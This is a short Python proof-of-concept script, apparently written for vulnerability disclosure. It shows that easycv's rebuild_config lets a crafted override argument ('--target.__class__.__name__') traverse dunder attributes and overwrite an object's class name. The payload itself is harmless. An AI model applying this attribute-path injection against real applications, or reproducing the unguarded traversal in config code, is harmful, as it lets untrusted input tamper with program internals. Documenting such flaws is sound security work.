# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: rebuild_config
# Type: get-attr-set-attr

from easycv.utils.config_tools import rebuild_config
from mmcv import Config

class Target: pass
target = Target()

# Create a minimal config that has target as an attribute
import tempfile, os
tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
tmp.write("target = None\n")
tmp.close()

cfg = Config.fromfile(tmp.name)
cfg.target = target
os.unlink(tmp.name)

payload_value = "pwnd"
PAYLOAD = ["--target.__class__.__name__", payload_value]

def run_poc():
  rebuild_config(cfg, PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
